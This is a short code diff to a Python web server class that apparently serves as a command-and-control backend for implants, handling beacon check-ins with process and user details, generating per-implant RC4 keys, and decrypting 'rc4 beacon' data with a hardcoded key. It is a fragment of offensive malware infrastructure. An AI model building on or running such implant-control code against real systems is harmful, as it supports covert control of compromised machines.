@@ -110,8 +110,9 @@ class WebServer(object):
             process_id = j["p"]
             current_user = j["u"]
 
-            # generates a random 32 character encryption key
-            encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(32))
+            # generates a random 32 character encryption key (only lower/upper letters, no numbers)
+            # numbers fucks up the rc4 crypt() function
+            encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters) for _ in range(32))
 
             # gets current time (uses server's time)
             now = datetime.datetime.now()
@@ -132,13 +133,7 @@ class WebServer(object):
 
         # else rc4 beacon
         else:
-            # TO DO: SELECT encryption_key FROM implants query here
 
-            # TO DO: loop through each queried encryption key and try to decrypt post data (self.data)
-            
-            #print(self.data)
-            print("Decrypted:")
-            print(self.crypt("123456", self.data))
-
+            print(self.crypt("WvpMvdDqbmTwPVJybgQBnKoTQbbfRZKE", self.data))
 
             return "rc4 beacon"
